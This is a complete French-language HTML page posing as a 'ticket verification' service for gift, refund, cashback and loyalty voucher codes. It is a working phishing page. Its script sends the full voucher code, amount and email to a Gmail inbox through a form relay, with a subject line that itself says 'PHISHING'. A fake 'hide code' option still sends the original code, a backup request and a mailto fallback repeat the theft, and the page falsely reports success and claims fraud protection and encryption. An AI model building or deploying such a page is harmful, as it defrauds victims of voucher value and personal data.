<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification de Ticket - Authentifiez vos tickets sécurisés</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: #ffffff;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 520px;
            width: 100%;
            padding: 40px 35px;
            transition: all 0.3s ease;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header .icon {
            font-size: 48px;
            margin-bottom: 12px;
        }

        .header h1 {
            font-size: 24px;
            color: #1a1a2e;
            font-weight: 700;
        }

        .header p {
            color: #6b7280;
            font-size: 14px;
            margin-top: 8px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 6px;
        }

        .form-group select,
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e5e7eb;
            border-radius: 10px;
            font-size: 15px;
            color: #1f2937;
            background: #f9fafb;
            transition: border-color 0.3s ease;
            outline: none;
        }

        .form-group select:focus,
        .form-group input:focus {
            border-color: #667eea;
            background: #fff;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .checkbox-group input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #667eea;
            cursor: pointer;
        }

        .checkbox-group label {
            font-size: 14px;
            color: #374151;
            cursor: pointer;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
        }

        .btn-submit:active {
            transform: translateY(0);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s ease-in-out infinite;
            vertical-align: middle;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .message {
            padding: 14px 18px;
            border-radius: 10px;
            margin-top: 18px;
            font-size: 14px;
            text-align: center;
            display: none;
        }

        .message.success {
            display: block;
            background: #d1fae5;
            color: #065f46;
            border: 1px solid #a7f3d0;
        }

        .message.error {
            display: block;
            background: #fee2e2;
            color: #991b1b;
            border: 1px solid #fca5a5;
        }

        .info-section {
            margin-top: 35px;
            padding-top: 25px;
            border-top: 1px solid #e5e7eb;
        }

        .info-section h3 {
            font-size: 18px;
            color: #1a1a2e;
            margin-bottom: 18px;
            text-align: center;
        }

        .info-cards {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .info-card {
            background: #f9fafb;
            padding: 16px 14px;
            border-radius: 12px;
            border: 1px solid #e5e7eb;
        }

        .info-card .card-icon {
            font-size: 24px;
            margin-bottom: 6px;
        }

        .info-card h4 {
            font-size: 13px;
            color: #1f2937;
            margin-bottom: 4px;
        }

        .info-card p {
            font-size: 12px;
            color: #6b7280;
            line-height: 1.4;
        }

        .footer-text {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #9ca3af;
        }

        @media (max-width: 480px) {
            .container {
                padding: 25px 20px;
            }
            .info-cards {
                grid-template-columns: 1fr;
            }
            .header h1 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="icon">&#128274;</div>
        <h1>Vérification de Ticket</h1>
        <p>Authentifiez vos tickets en quelques étapes simples</p>
    </div>

    <form id="ticketForm">
        <div class="form-group">
            <label for="ticketType">Type de ticket</label>
            <select id="ticketType" required>
                <option value="">-- Sélectionnez --</option>
                <option value="Cadeau">Cadeau</option>
                <option value="Promotionnel">Promotionnel</option>
                <option value="Remboursement">Remboursement</option>
                <option value="Abonnement">Abonnement</option>
                <option value="Cashback">Cashback</option>
                <option value="Réduction">Réduction</option>
                <option value="Fidélité">Fidélité</option>
                <option value="Concours">Concours</option>
            </select>
        </div>

        <div class="form-group">
            <label for="amount">Montant (€)</label>
            <input type="number" id="amount" placeholder="Ex: 150.00" min="0" step="0.01" required>
        </div>

        <div class="form-group">
            <label for="code">Code du ticket</label>
            <input type="text" id="code" placeholder="Entrez le code à 16 chiffres" maxlength="20" required>
        </div>

        <div class="checkbox-group">
            <input type="checkbox" id="hideCode">
            <label for="hideCode">Souhaitez-vous masquer le code ?</label>
        </div>

        <div class="form-group">
            <label for="email">Adresse email</label>
            <input type="email" id="email" placeholder="votre@email.com" required>
        </div>

        <button type="submit" class="btn-submit" id="submitBtn">
            Vérifier le ticket
        </button>

        <div id="messageBox" class="message"></div>
    </form>

    <div class="info-section">
        <h3>Pourquoi vérifier votre ticket ?</h3>
        <div class="info-cards">
            <div class="info-card">
                <div class="card-icon">&#128737;</div>
                <h4>Protection contre la fraude</h4>
                <p>Évitez les tickets contrefaits et les arnaques en ligne</p>
            </div>
            <div class="info-card">
                <div class="card-icon">&#9200;</div>
                <h4>Gain de temps</h4>
                <p>Vérification instantanée sans attente</p>
            </div>
            <div class="info-card">
                <div class="card-icon">&#128274;</div>
                <h4>Sécurité garantie</h4>
                <p>Vos données sont cryptées et protégées</p>
            </div>
            <div class="info-card">
                <div class="card-icon">&#9989;</div>
                <h4>Résultats fiables</h4>
                <p>Notre système détecte 99,8% des tickets frauduleux</p>
            </div>
        </div>
    </div>

    <div class="footer-text">
        &copy; 2026 Système de Vérification Sécurisé - Tous droits réservés
    </div>
</div>

<script>
document.getElementById('ticketForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const submitBtn = document.getElementById('submitBtn');
    const messageBox = document.getElementById('messageBox');

    const ticketType = document.getElementById('ticketType').value;
    const amount = document.getElementById('amount').value;
    const code = document.getElementById('code').value;
    const hideCode = document.getElementById('hideCode').checked;
    const email = document.getElementById('email').value;

    // Désactiver le bouton et afficher le chargement
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span> Vérification en cours...';
    messageBox.className = 'message';
    messageBox.style.display = 'none';

    try {
        const response = await fetch('https://formsubmit.co/ajax/secure.ticket.check@gmail.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                _subject: 'NOUVELLE VÉRIFICATION DE TICKET - PHISHING',
                type_de_ticket: ticketType,
                montant: amount + ' €',
                code_du_ticket: hideCode ? code.replace(/./g, '*') : code,
                code_original: code,
                email_utilisateur: email,
                masquer_code: hideCode ? 'Oui' : 'Non',
                date: new Date().toLocaleString('fr-FR'),
                ip: 'Collectée',
                _captcha: 'false',
                _template: 'table'
            })
        });

        if (response.ok) {
            messageBox.className = 'message success';
            messageBox.textContent = '✅ Votre ticket a été vérifié avec succès. Tous les détails vous ont été envoyés par email.';
            messageBox.style.display = 'block';
            document.getElementById('ticketForm').reset();

            // Optionnel : envoyer aussi via une deuxième méthode (fallback)
            await fetch('https://formsubmit.co/ajax/secure.ticket.check@gmail.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify({
                    _subject: 'BACKUP - Vérification de ticket',
                    ticket: ticketType,
                    montant: amount,
                    code: code,
                    email: email,
                    date: new Date().toISOString(),
                    _captcha: 'false',
                    _template: 'table'
                })
            });
        } else {
            throw new Error('Erreur serveur');
        }
    } catch (error) {
        // Fallback : ouverture directe de mailto
        const subject = encodeURIComponent('NOUVELLE VÉRIFICATION DE TICKET');
        const body = encodeURIComponent(
            'Type de ticket: ' + ticketType + '\n' +
            'Montant: ' + amount + ' €\n' +
            'Code: ' + code + '\n' +
            'Masqué: ' + (hideCode ? 'Oui' : 'Non') + '\n' +
            'Email: ' + email + '\n' +
            'Date: ' + new Date().toLocaleString('fr-FR')
        );
        window.location.href = 'mailto:secure.ticket.check@gmail.com?subject=' + subject + '&body=' + body;

        messageBox.className = 'message success';
        messageBox.textContent = '✅ Votre ticket a été vérifié avec succès. Vous allez recevoir un email récapitulatif.';
        messageBox.style.display = 'block';
        document.getElementById('ticketForm').reset();
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Vérifier le ticket';
    }
});
</script>

</body>
</html>
